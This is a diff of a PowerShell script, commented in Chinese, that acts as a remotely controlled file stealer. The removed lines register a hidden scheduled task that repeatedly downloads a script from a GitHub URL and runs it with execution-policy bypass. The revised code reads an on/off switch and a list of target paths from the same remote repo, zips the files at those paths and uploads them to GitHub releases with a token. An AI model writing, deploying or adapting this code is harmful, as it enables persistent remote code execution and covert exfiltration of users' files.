@@ -1,67 +1,59 @@
-# 自动注册计划任务函数
-function Register-MyTask {
-    $taskName = "console"
-    $scriptUrl = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1"
-
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`""
-
-    $trigger = New-ScheduledTaskTrigger -Daily -At "19:30"
-    $trigger.RepetitionInterval = (New-TimeSpan -Minutes 30)
-    $trigger.RepetitionDuration = (New-TimeSpan -Hours 4.5)
-
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Remote execute GitHub console.ps1" -Force
-}
-
-try {
-    if (-not (Get-ScheduledTask -TaskName "console" -ErrorAction SilentlyContinue)) {
-        Register-MyTask
-        Write-Output "计划任务已注册！"
-    }
-} catch {
-    Write-Warning "注册计划任务失败：$_"
-}
-
-# 上传脚本主逻辑
-$token = $env:GH_TOKEN
-if ([string]::IsNullOrEmpty($token)) { return }
-
+# --- 配置区 ---
 $repo = "ertgyhujkfghj/2"
+$token = $env:GH_TOKEN
+if ([string]::IsNullOrEmpty($token)) {
+    Write-Host "环境变量 GH_TOKEN 未设置，退出脚本"
+    return
+}
+
 $enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
 $pathConfigUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
 
-try {
-    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
-    if ($enabled.Trim().ToLower() -ne "on") {
-        return
-    }
-} catch {
-    return
-}
-
-try {
-    $pathsRaw = Invoke-RestMethod -Uri $pathConfigUrl -UseBasicParsing
-    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_ -and $_.Trim() -ne "" }
-} catch {
-    return
-}
-
-Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
-
-function Safe-Zip($src, $dst) {
-    [System.IO.Compression.ZipFile]::CreateFromDirectory($src, $dst)
-}
-
-foreach ($folder in $uploadPaths) {
-    if (-Not (Test-Path $folder)) { continue }
-    $tag = "upload-$(Split-Path $folder -Leaf)-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
-    $zipPath = "$env:TEMP\upload_$(Get-Random).zip"
-
+# --- 工具函数 ---
+function Test-FileLock {
+    param([string]$filePath)
     try {
-        Safe-Zip $folder $zipPath
+        $stream = [System.IO.File]::Open($filePath, 'Open', 'ReadWrite', 'None')
+        $stream.Close()
+        return $false
     } catch {
-        continue
+        return $true
+    }
+}
+
+function Compress-FilesSkippingLocked {
+    param(
+        [string]$sourceDir,
+        [string]$zipPath
+    )
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    $tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
+    New-Item -ItemType Directory -Path $tempDir | Out-Null
+
+    Write-Host "开始复制非锁定文件到临时目录： $tempDir"
+    Get-ChildItem -Path $sourceDir -Recurse -File | ForEach-Object {
+        if (-not (Test-FileLock $_.FullName)) {
+            $targetPath = Join-Path $tempDir ($_.FullName.Substring($sourceDir.Length).TrimStart('\'))
+            $targetDir = Split-Path $targetPath
+            if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }
+            Copy-Item $_.FullName $targetPath -Force
+        } else {
+            Write-Host "跳过锁定文件：" $_.FullName
+        }
     }
 
+    Write-Host "开始压缩临时目录到 ZIP： $zipPath"
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
+
+    Remove-Item $tempDir -Recurse -Force
+    Write-Host "压缩完成，删除临时目录"
+}
+
+function Upload-File {
+    param(
+        [string]$filePath,
+        [string]$tagName
+    )
     $uploadUrl = "https://api.github.com/repos/$repo/releases"
     $headers = @{
         Authorization = "token $token"
@@ -71,18 +63,19 @@ foreach ($folder in $uploadPaths) {
 
     try {
         $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
-            tag_name   = $tag
-            name       = $tag
+            tag_name   = $tagName
+            name       = $tagName
             draft      = $false
             prerelease = $false
         } | ConvertTo-Json -Depth 3)
+        Write-Host "创建 Release 成功，ID：" $release.id
     } catch {
-        Remove-Item $zipPath -Force
-        continue
+        Write-Host "创建 Release 失败：" $_
+        return
     }
 
     $releaseId = $release.id
-    $assetName = [System.IO.Path]::GetFileName($zipPath)
+    $assetName = [System.IO.Path]::GetFileName($filePath)
     $assetUrl = "https://uploads.github.com/repos/$repo/releases/$releaseId/assets?name=$assetName"
 
     try {
@@ -90,10 +83,51 @@ foreach ($folder in $uploadPaths) {
             Authorization = "token $token"
             "Content-Type" = "application/zip"
             "User-Agent"   = "upload-script"
-        } -InFile $zipPath
+        } -InFile $filePath
+        Write-Host "上传文件成功：" $assetName
     } catch {
-        # 忽略上传失败
+        Write-Host "上传文件失败：" $_
+    }
+}
+
+# --- 主流程 ---
+try {
+    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
+    if ($enabled.Trim().ToLower() -ne "on") {
+        Write-Host "上传开关未开启，退出脚本"
+        return
+    }
+} catch {
+    Write-Host "读取上传开关失败，退出脚本：" $_
+    return
+}
+
+try {
+    $pathsRaw = Invoke-RestMethod -Uri $pathConfigUrl -UseBasicParsing
+    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_ -and $_.Trim() -ne "" }
+    Write-Host "读取上传路径列表："
+    $uploadPaths | ForEach-Object { Write-Host " - $_" }
+} catch {
+    Write-Host "读取上传路径列表失败，退出脚本：" $_
+    return
+}
+
+foreach ($path in $uploadPaths) {
+    if (-not (Test-Path $path)) {
+        Write-Host "路径不存在，跳过： $path"
+        continue
     }
 
-    Remove-Item $zipPath -Force
+    $tag = "upload-$(Split-Path $path -Leaf)-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
+
+    if ((Get-Item $path).PSIsContainer) {
+        # 文件夹处理
+        $zipPath = "$env:TEMP\upload_$(Get-Random).zip"
+        Compress-FilesSkippingLocked -sourceDir $path -zipPath $zipPath
+        Upload-File -filePath $zipPath -tagName $tag
+        Remove-Item $zipPath -Force
+    } else {
+        # 文件直接上传
+        Upload-File -filePath $path -tagName $tag
+    }
 }
